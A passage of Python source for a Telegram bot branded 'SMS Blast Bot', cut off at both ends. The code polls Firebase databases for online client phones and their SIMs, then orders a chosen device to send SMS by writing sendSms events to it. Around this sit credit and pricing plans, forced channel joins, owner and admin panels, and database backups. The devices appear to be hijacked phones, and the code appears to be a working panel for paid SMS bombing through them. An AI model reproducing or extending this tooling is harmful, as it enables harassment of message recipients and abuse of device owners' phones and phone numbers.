        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑", style="danger")]
    ])

def mask_number(n: str) -> str:
    if len(n) <= 4: return n
    return n[:2] + "******" + n[-4:]

def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(sec: int) -> str:
    if sec < 60: return f"{sec}s"
    return f"{sec // 60}m {sec % 60}s"

def get_scan_status() -> str:
    if SCANNING_IN_PROGRESS: return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."
    if not CACHED_DEVICES: return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
    diff = time.time() - LAST_SCAN_TIME
    n = len(CACHED_DEVICES)
    if diff < 60: return f"{em(EMOJI_CHECK, '🟢')} {n} ᴅᴇᴠɪᴄᴇs"
    if diff < 300: return f"{em(EMOJI_WARNING, '🟡')} {n} ᴅᴇᴠɪᴄᴇs ({int(diff/60)}ᴍ ᴏʟᴅ)"
    return f"{em(EMOJI_CROSS, '🔴')} {n} ᴅᴇᴠɪᴄᴇs ({int(diff/60)}ᴍ ᴏʟᴅ)"


# ═══════════════════════════════════════════════════════════════════════
# FIREBASE DISCOVERY
# ═══════════════════════════════════════════════════════════════════════
def device_is_online(data: dict) -> bool:
    return any([
        data.get("isOnline"), data.get("online"), data.get("connected"),
        data.get("status") in ("online", "active", True, 1),
    ])

async def get_all_online_devices(d: dict) -> list[dict]:
    fbs = d.get("firebases", [])
    if not fbs: return []
    results: list[dict] = []
    cur = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dv for dv in CACHED_DEVICES if dv.get("fb_id") in cur]
    sem = asyncio.Semaphore(15)

    async def fetch_one(fb: dict):
        cb = breaker_for(fb["url"])
        if cb.is_open(): return
        try:
            url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
            async with http().get(url) as r:
                if r.status != 200:
                    cb.record_failure(); return
                txt = (await r.text()).strip()
                cb.record_success()
                if txt == "null" or not txt: return
                ids = json.loads(txt)
                if not isinstance(ids, dict): return

                async def fetch_dev(dev_id: str):
                    try:
                        u = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                        async with sem:
                            async with http().get(u) as r2:
                                if r2.status != 200: return None
                                t = (await r2.text()).strip()
                                if t == "null" or not t: return None
                                dd = json.loads(t)
                                if isinstance(dd, dict) and device_is_online(dd):
                                    return {
                                        "fb_id": fb["id"], "fb_url": fb["url"],
                                        "fb_label": fb.get("label", fb["url"][:30]),
                                        "dev_id": dev_id,
                                        "dev_name": dd.get("deviceName") or dd.get("name") or dev_id[:16],
                                        "sims": dd.get("sims", []),
                                    }
                    except Exception as e:
                        log.warning(f"dev {dev_id}: {e}")
                    return None

                all_ids = list(ids.keys())
                for i in range(0, len(all_ids), 20):
                    batch = all_ids[i:i+20]
                    for res in await asyncio.gather(*(fetch_dev(x) for x in batch)):
                        if res: results.append(res)
        except Exception as e:
            log.warning(f"fb scan {fb['url']}: {e}")
            cb.record_failure()

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int,
                              to: str, message: str) -> bool:
    return await fb_put(
        fb_url, f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {"from": sim_slot, "to": to.strip(), "message": message.strip(),
         "isSended": False, "timestamp": int(time.time())},
    )


# ═══════════════════════════════════════════════════════════════════════
# FORCE JOIN
# ═══════════════════════════════════════════════════════════════════════
async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    key = (uid, str(channel_id))
    now = time.time()
    c = _FJ_CACHE.get(key)
    if c and (now - c[1]) < _FORCE_JOIN_CACHE_TTL:
        return c[0]
    try:
        cid = int(str(channel_id).strip())
        m = await bot.get_chat_member(cid, uid)
        ok = m.status in ("member", "administrator", "creator")
        _FJ_CACHE[key] = (ok, now)
        return ok
    except Exception as e:
        log.error(f"fj check {channel_id}: {e}")
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple:
    if is_owner(uid, d): return True, []
    fj = d.get("force_join", {})
    if not fj.get("enabled"): return True, []
    missing = []
    for ch in fj.get("channels", []):
        if ch.get("required", True) and not await check_membership(bot, uid, ch["id"]):
            missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ᴄʜᴀɴɴᴇʟs/ɢʀᴏᴜᴘs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:",
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{escape(ch['link'])}'>{escape(ch.get('title', 'Channel'))}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad /start karein ya refresh dabayein.')}</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}",
                             ch["link"], EMOJI_BELL, "🔔", style="success")])
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


# ═══════════════════════════════════════════════════════════════════════
# BACKUP ENGINE
# ═══════════════════════════════════════════════════════════════════════
async def do_backup_send(bot: Bot, manual: bool = False) -> tuple:
    d = load()
    cfg = d.get("backup", {})
    chat_id = cfg.get("chat_id")
    if not chat_id: return False, "no target chat set"
    if not os.path.exists(_DATA_FILE): return False, "db file missing"

    size = os.path.getsize(_DATA_FILE)
    caption = (
        f"{em(EMOJI_BELL, '💾')} <b>Database Backup</b>\n\n"
        f"{em(EMOJI_GEAR, '📅')} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"{em(EMOJI_STAR, '📦')} size: <b>{_human_bytes(size)}</b>\n"
        f"{em(EMOJI_STAR, '👥')} users: <b>{len(d.get('users', {}))}</b>\n"
        f"{em(EMOJI_GEAR, '⚙️')} {'manual' if manual else 'scheduled'}"
    )
    try:
        await bot.send_document(chat_id=chat_id, document=FSInputFile(_DATA_FILE),
                                caption=caption, parse_mode="HTML")
    except Exception as e:
        err = str(e)[:80]
        def _m(dd):
            c = dd.setdefault("backup", {})
            c["last_sent"] = int(time.time())
            c["last_status"] = f"fail:{err}"
            c.setdefault("history", []).append(
                {"ts": int(time.time()), "ok": False, "bytes": size, "err": err})
            c["history"] = c["history"][-30:]
        atomic_update(_m, flush_immediately=False)
        return False, err

    try:
        os.makedirs("backups", exist_ok=True)
        dst = f"backups/backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        shutil.copy2(_DATA_FILE, dst)
        files = sorted(os.listdir("backups"))
        for f in files[:-7]:
            try: os.remove(os.path.join("backups", f))
            except Exception: pass
    except Exception:
        pass

    def _mok(dd):
        c = dd.setdefault("backup", {})
        c["last_sent"] = int(time.time())
        c["last_status"] = "ok"
        c.setdefault("history", []).append(
            {"ts": int(time.time()), "ok": True, "bytes": size, "err": ""})
        c["history"] = c["history"][-30:]
    atomic_update(_mok, flush_immediately=False)
    return True, "ok"

async def backup_scheduler(bot: Bot):
    log.info("Backup scheduler started")
    while True:
        try:
            d = load()
            cfg = d.get("backup", {})
            if cfg.get("enabled") and cfg.get("chat_id") and cfg.get("times"):
                now = datetime.now()
                hhmm = now.strftime("%H:%M")
                today = now.strftime("%Y-%m-%d")
                for t in cfg["times"]:
                    if t == hhmm and _BACKUP_LAST_FIRED.get(t) != today:
                        _BACKUP_LAST_FIRED[t] = today
                        ok, msg = await do_backup_send(bot, manual=False)
                        log.info(f"scheduled backup [{t}]: {'ok' if ok else msg}")
        except Exception as e:
            log.error(f"backup scheduler: {e}")
        await asyncio.sleep(30)


# ═══════════════════════════════════════════════════════════════════════
# BACKGROUND SCANNER
# ═══════════════════════════════════════════════════════════════════════
async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG
    log.info("Background Firebase Scanner STARTED")
    first = False
    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5); continue
            SCANNING_IN_PROGRESS = True
        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ ᴀᴘɪs..."
        t0 = time.time()
        try:
            d = load()
            fbs = d.get("firebases", [])
            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ ᴅʙs ᴄᴏɴғɪɢᴜʀᴇᴅ"
                CACHED_DEVICES = []
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue
            devices = await get_all_online_devices(d)
            dur = time.time() - t0
            CACHED_DEVICES = devices
            for fb in fbs:
                fid = fb["id"]
                fb_label = fb.get("label", fb["url"][:30])
                cnt = sum(1 for dv in devices if dv["fb_id"] == fid)
                FB_DEVICE_COUNTS[fid] = {"label": fb_label, "online": cnt,
                                         "last_update": int(time.time())}
            LAST_SCAN_TIME = time.time()
            DEVICE_HEALTH_LOG.append({
                "timestamp": int(time.time()),
                "devices_found": len(devices),
                "dbs_scanned": len(fbs),
                "duration_sec": round(dur, 2),
                "status": "healthy" if devices else "no_devices",
            })
            if len(DEVICE_HEALTH_LOG) > 100:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

            if devices:
                SCAN_STATUS = (f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ "
                               f"| ʟᴀsᴛ: {fmt_time(int(time.time()))}")
                log.info(f"[BG-SCAN] {len(devices)} devices | {len(fbs)} DBs | {dur:.1f}s")
                cur_ids = {fb["id"] for fb in fbs}
                for k in [k for k in FB_DEVICE_COUNTS if k not in cur_ids]:
                    FB_DEVICE_COUNTS.pop(k, None)
                if not first:
                    try:
                        await bot.send_message(MAIN_OWNER,
                            f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('background scanner active!')}</b>\n\n"
                            f"{em(EMOJI_PHONE, '📱')} ᴅᴇᴠɪᴄᴇs: <b>{len(devices)}</b>\n"
                            f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ: <b>{len(fbs)}</b>\n"
                            f"{em(EMOJI_WARNING, '⏱')} sᴄᴀɴ: <b>{dur:.1f}s</b>",
                            parse_mode="HTML")
                    except Exception: pass
                    first = True
            else:
                SCAN_STATUS = (f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs "
                               f"| ʟᴀsᴛ: {fmt_time(int(time.time()))}")
        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:30]}"
            log.error(f"[BG-SCAN] {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False
        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

def get_cached_devices() -> list: return CACHED_DEVICES


# ═══════════════════════════════════════════════════════════════════════
# PANEL TEXT
# ═══════════════════════════════════════════════════════════════════════
def _fb_summary_lines(max_disp: int = 5) -> str:
    items = list(FB_DEVICE_COUNTS.items())
    lines = []
    for i, (_fid, data) in enumerate(items):
        if i >= max_disp:
            lines.append(f"  {em(EMOJI_STAR, '➕')} +{len(items)-max_disp} more...")
            break
        age = int(time.time() - data.get("last_update", 0))
        s = em(EMOJI_CHECK, "🟢") if age < 60 else em(EMOJI_WARNING, "🟡") if age < 300 else em(EMOJI_CROSS, "🔴")
        lines.append(f"  {s} {data['label'][:20]}: {data['online']} ᴏɴʟɪɴᴇ")
    return "\n".join(lines) if lines else f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴅᴀᴛᴀ"

def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ"
    fj_status = f"{em(EMOJI_CHECK, '🟢')} ᴏɴ" if d.get("force_join", {}).get("enabled") else f"{em(EMOJI_CROSS, '🔴')} ᴏғғ"
    active = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    return (
        f"{em(EMOJI_CROWN, '👑')} <b>{sc('owner panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} sᴜᴘᴇʀ ᴀᴅᴍɪɴs  : <b>{len(d.get('owners', []))}</b>/6\n"
        f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴs        : <b>{len(d.get('admins', []))}</b>\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(d.get('users', {}))}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(d.get('videos', []))}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{d.get('stats', {}).get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{d.get('stats', {}).get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ    : {fj_status}\n"
        f"{em(EMOJI_MONEY, '💳')} ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs : <b>{len(d.get('pricing', {}).get('plans', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{_fb_summary_lines()}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {get_scan_status()}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def admin_panel_text(d: dict) -> str:
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ"
    active = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    return (
        f"{em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> — sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(d.get('users', {}))}</b>\n"
        f"{em(EMOJI_VIDEO, '📹')} ᴠɪᴅᴇᴏs        : <b>{len(d.get('videos', []))}</b>\n"
        f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ        : <b>{len(d.get('banned', []))}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{d.get('stats', {}).get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{d.get('stats', {}).get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(d.get('firebases', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"{em(EMOJI_PHONE, '📱')} ᴘᴇʀ ғɪʀᴇʙᴀsᴇ  :\n{_fb_summary_lines()}\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {get_scan_status()}\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

def user_home_text(uid: int, d: dict) -> str:
    u = d["users"].get(str(uid), {})
    dev_tag = "<a href='https://t.me/flirts_x'>ㅤ⏤͟͟͞͞𝗙ʟɪʀᴛ𝗫ᴏ</a>"
    loop_row = em("5465270065102334742", "➿") * 14
    return (
        f"<blockquote>"
        f"{dev_tag}:\n"
        f"{loop_row}{em('6239930832128056797', '📱')} <b>sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}</b>\n"
        f"Owner: {SUPER_ADMIN_NAME}\n\n"
        f"{em('6125230925874731296', '➡️')} ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
        f"{em('6104820463895057992', '🔗')} ᴄʀᴇᴅɪᴛs : <b>{u.get('credits', 0)}</b>\n"
        f"{em('6107130683853903534', '🤝')} ᴜsᴇs    : <b>{u.get('uses', 0)}</b>\n"
        f"{em('6120470070591230163', '🌟')} ᴀᴘɪs    : <b>{len(d.get('firebases', []))}</b> ғɪʀᴇʙᴀsᴇ(s)\n"
        f"{em('5339264095528970303', '🖕')} sᴄᴀɴɴᴇʀ : {get_scan_status()}\n\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em('5359664288241829619', '🚀')}\n"
        f"ᴅᴇᴠᴇʟᴏᴘᴇ ʙʏ {dev_tag} {em('5276367933021391925', '🥰')}"
        f"</blockquote>"
    )

def user_home_text_v2(uid: int, d: dict) -> str:
    u = d["users"].get(str(uid), {})
    hist = d.get("sms_history", {}).get(str(uid), [])
    last = hist[-1] if hist else None
    dev = "<a href='https://t.me/flirts_x'>ㅤ⏤͟͟͞͞𝗙ʟɪʀᴛ𝗫ᴏ</a>"
    loop = em("5465270065102334742", "➿") * 12
    last_line = f"⏱ Last blast: <b>{fmt_time(last.get('timestamp', 0))}</b>\n" if last else ""
    return (
        f"<blockquote>"
        f"{loop}{em(EMOJI_PHONE, '📱')} <b>SMS Blast {_VERSION}</b>\n"
        f"owner: {SUPER_ADMIN_NAME}\n\n"
        f"👤 role    · {role_tag(uid, d)}\n"
        f"💰 credits · <b>{u.get('credits', 0)}</b>\n"
        f"📤 sent    · <b>{u.get('uses', 0)}</b>\n"
        f"🔥 APIs    · <b>{len(d.get('firebases', []))}</b>\n"
        f"{last_line}"
        f"━━━━━━━━━━━━━━━\n"
        f"{get_scan_status()}\n\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET, '🚀')}\n"
        f"ᴅᴇᴠ {dev}"
        f"</blockquote>"
    )

def no_access_text(uid: int, d: dict) -> str:
    return (
        f"{em(EMOJI_CROSS, '⛔')} <b>Access Required</b>\n\n"
        f"{em(EMOJI_GEAR, '🆔')} Your ID: <code>{uid}</code>\n"
        f"{em(EMOJI_SHIELD, '🎭')} Role: {role_tag(uid, d)}\n\n"
        f"{em(EMOJI_STAR, '💡')} Bot use karne ke liye:\n"
        f"  • Free mode enable hone ka wait karein, ya\n"
        f"  • Owner se approval request karein\n\n"
        f"{em(EMOJI_GEAR, '🔗')} Contact: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>"
    )

def fb_detail_text(fb: dict, d: dict) -> str:
    devices = [dv for dv in CACHED_DEVICES if dv["fb_id"] == fb["id"]]
    cb = breaker_for(fb["url"])
    state = "🔴 open (failing)" if cb.is_open() else "🟢 healthy"
    ago = int(time.time() - LAST_SCAN_TIME) if LAST_SCAN_TIME else -1
    age_str = f"{ago}s ago" if ago >= 0 else "never"
    lines = [
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase</b>\n",
        f"{em(EMOJI_GEAR, '🏷')} {escape(fb.get('label', '?'))}",
        f"{em(EMOJI_GEAR, '🔗')} <code>{escape(fb['url'])}</code>\n",
        f"{em(EMOJI_SHIELD, '🔌')} Health: <b>{state}</b>",
        f"{em(EMOJI_PHONE, '📱')} Online devices: <b>{len(devices)}</b>",
        f"{em(EMOJI_STAR, '⏱')} Last scan: <b>{age_str}</b>\n",
    ]
    if devices:
        lines.append(f"━━━━━━━━━━━━━━━━━━\n<b>Devices</b>")
        for dv in devices[:10]:
            sims = len(dv.get("sims", [])) or 1
            lines.append(f"  📱 {escape(dv['dev_name'][:18])}  ·  SIMs {sims}")
        if len(devices) > 10:
            lines.append(f"  … +{len(devices)-10} more")
    else:
        lines.append("<i>no online devices</i>")
    return "\n".join(lines)

def user_detail_text(uid: int, d: dict) -> str:
    u = d.get("users", {}).get(str(uid), {})
    hist = d.get("sms_history", {}).get(str(uid), [])
    last = hist[-1] if hist else None
    manual = u.get("manual_added_credits", 0)
    ref = u.get("referred_by")
    rname = d["users"].get(str(ref), {}).get("name", "?") if ref else "—"
    banned = "🚫 BANNED" if uid in d.get("banned", []) else "✅ active"
    lines = [
        f"{em(EMOJI_STAR, '👤')} <b>User Detail</b>\n",
        f"{em(EMOJI_GEAR, '🆔')} <code>{uid}</code>",
        f"{em(EMOJI_CROWN, '🏷')} {escape(u.get('name', 'Unknown'))}",
        f"{em(EMOJI_SHIELD, '🎭')} {role_tag(uid, d)}  ·  {banned}\n",
        f"━━━━━━━━━━━━━━━━━━",
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{u.get('credits', 0)}</b>  (manual: {manual})",
        f"{em(EMOJI_CHECK, '📤')} SMS sent: <b>{u.get('uses', 0)}</b>",
        f"{em(EMOJI_GEAR, '📅')} Joined: <b>{fmt_time(u.get('joined_at', 0))}</b>",
        f"{em(EMOJI_STAR, '🤝')} Referred by: <b>{escape(rname)}</b>",
    ]
    if last:
        lines.append(
            f"\n{em(EMOJI_PHONE, '📞')} <b>Last SMS</b>  ·  {fmt_time(last.get('timestamp', 0))}\n"
            f"   → <code>{mask_number(last.get('number', '?'))}</code>  ·  {last.get('status', '?')}"
        )
    return "\n".join(lines)

def user_record_text(uid: int, d: dict) -> str:
    u = d.get("users", {}).get(str(uid), {})
    sms = d.get("sms_history", {}).get(str(uid), [])
    act = [a for a in d.get("activity_log", []) if a.get("uid") == uid]
    last = u.get("last_active", 0)
    ref = u.get("referred_by")
    rname = d["users"].get(str(ref), {}).get("name", "?") if ref else "—"
    lines = [
        f"📋 <b>User Record</b>\n",
        f"🆔 <code>{uid}</code>",
        f"👤 {escape(u.get('name', 'Unknown'))}",
        f"🎭 {role_tag(uid, d)}",
        f"━━━━━━━━━━━━━━━━━━",
        f"💰 credits: <b>{u.get('credits', 0)}</b>  (manual: {u.get('manual_added_credits', 0)})",
        f"📤 sms sent: <b>{u.get('uses', 0)}</b>",
        f"📅 joined: <b>{fmt_time(u.get('joined_at', 0))}</b>",
        f"⏱ last active: <b>{fmt_time(last) if last else 'never'}</b>",
        f"🤝 referred by: <b>{escape(rname)}</b>",
        f"",
        f"📜 <b>SMS history</b> ({len(sms)})",
    ]
    for h in reversed(sms[-5:]):
        icon = "✅" if h.get("status") == "sent" else "⏳" if h.get("status") == "stopped" else "❌"
        lines.append(f"   {icon} {fmt_time(h.get('timestamp', 0))} → {mask_number(h.get('number', '?'))}")
    lines.append(f"\n📊 <b>Activity</b> ({len(act)})")
    for a in reversed(act[-5:]):
        lines.append(f"   · {fmt_time(a['timestamp'])} — {escape(a['action'])} {escape(a.get('details', '')[:30])}")
    return "\n".join(lines)

def backup_panel_text(d: dict) -> str:
    cfg = d.get("backup", {})
    enabled = cfg.get("enabled", False)
    chat = cfg.get("chat_id")
    title = cfg.get("chat_title") or (str(chat) if chat else "—")
    times = cfg.get("times", [])
    last = cfg.get("last_sent", 0)
    last_str = fmt_time(last) if last else "never"
    status = cfg.get("last_status") or "—"
    sicon = "✅" if status == "ok" else ("❌" if status.startswith("fail") else "⏳")
    st = get_storage_stats()
    return (
        f"{em(EMOJI_BELL, '💾')} <b>Auto Backup</b>\n\n"
        f"{em(EMOJI_GEAR, '🔘')} status: <b>{'🟢 enabled' if enabled else '🔴 disabled'}</b>\n"
        f"{em(EMOJI_STAR, '🎯')} target: <b>{escape(title)}</b>\n"
        f"{em(EMOJI_GEAR, '⏰')} times: <b>{', '.join(times) if times else '—'}</b>\n"
        f"{em(EMOJI_STAR, '⏱')} last: <b>{last_str}</b>  {sicon}\n\n"
        f"{em(EMOJI_STAR, '📦')} <b>Storage</b>\n"
        f"   db: <b>{_human_bytes(st['data'])}</b>\n"
        f"   local: <b>{_human_bytes(st['backup'])}</b> ({st['backup_count']} files)\n"
        f"   total: <b>{_human_bytes(st['total'])}</b>"
    )

def monitoring_text(d: dict) -> str:
    dau = get_dau_stats(d)
    st = get_storage_stats()
    cfg = d.get("backup", {})
    users = d.get("users", {})
    stats = d.get("stats", {})
    week_ago = time.time() - 7 * 86400
    new_week = sum(1 for u in users.values() if u.get("joined_at", 0) >= week_ago)
    top = sorted(users.items(), key=lambda kv: kv[1].get("uses", 0), reverse=True)[:5]
    top_lines = []
    for uid_str, u in top:
        if u.get("uses", 0) == 0: break
        top_lines.append(
            f"  <code>{uid_str}</code> · {escape(u.get('name', '?')[:14])} · "
            f"📤{u.get('uses', 0)} · 💰{u.get('credits', 0)}")
    top_str = "\n".join(top_lines) if top_lines else "  <i>none</i>"
    bk = "🟢" if cfg.get("enabled") else "🔴"
    lb = cfg.get("last_sent", 0)
    return (
        f"{em(EMOJI_STAR, '📊')} <b>Live Monitoring</b>\n\n"
        f"{em(EMOJI_STAR, '👥')} <b>Users</b>\n"
        f"   total: <b>{dau['total_users']}</b>  ·  new 7d: <b>{new_week}</b>\n"
        f"   🟢 now: <b>{dau['active_now']}</b>  ·  24h: <b>{dau['active_24h']}</b>\n\n"
        f"{em(EMOJI_ROCKET, '📈')} <b>DAU</b>\n"
        f"   today: <b>{dau['today']}</b>  ·  yesterday: <b>{dau['yesterday']}</b>\n"
        f"   7d total: <b>{dau['week_total']}</b>\n\n"
        f"{em(EMOJI_CHECK, '📤')} <b>Blast volume</b>\n"
        f"   sent: <b>{stats.get('total_sent', 0)}</b>  ·  failed: <b>{stats.get('total_failed', 0)}</b>\n\n"
        f"{em(EMOJI_STAR, '📦')} <b>Storage</b>\n"
        f"   db: <b>{_human_bytes(st['data'])}</b>  ·  backups: <b>{_human_bytes(st['backup'])}</b>\n"
        f"   total: <b>{_human_bytes(st['total'])}</b>\n\n"
        f"{em(EMOJI_BELL, '💾')} <b>Backup</b>  {bk}\n"
        f"   last: <b>{fmt_time(lb) if lb else 'never'}</b>\n\n"
        f"{em(EMOJI_CROWN, '🏆')} <b>Top users</b>\n{top_str}"
    )

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}
    lines = [
        f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━",
        f"<b>{sc('per firebase:')}</b>",
    ]
    if not api_use:
        lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fs in api_use.items():
        fb = fbs.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        lines.append(
            f"{em(EMOJI_FIRE, '🔥')} {escape(label)}\n"
            f"   {em(EMOJI_CHECK, '✅')} {fs.get('sent', 0)} sᴇɴᴛ  "
            f"{em(EMOJI_CROSS, '❌')} {fs.get('failed', 0)} ғᴀɪʟᴇᴅ")
    return "\n".join(lines)

def bcast_preview_text(text: str, button: Optional[dict]) -> str:
    lines = [
        f"{em(EMOJI_BELL, '📢')} <b>Broadcast Preview</b>\n",
        f"━━━━━━━━━━━━━━━━━━",
        f"{escape(text)}\n",
        f"━━━━━━━━━━━━━━━━━━",
    ]
    if button:
        lines.append(f"🔗 Button: <b>{escape(button['text'])}</b> → {escape(button['url'])}")
    else:
        lines.append("🔗 <i>no button</i>")
    return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════════
# KEYBOARDS
# ═══════════════════════════════════════════════════════════════════════
def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = ("🔴 " + sc("disable free mode"), "owner:free:off") if d.get("free_mode") \
               else ("🟢 " + sc("enable free mode"), "owner:free:on")
    return InlineKeyboardMarkup(inline_keyboard=[
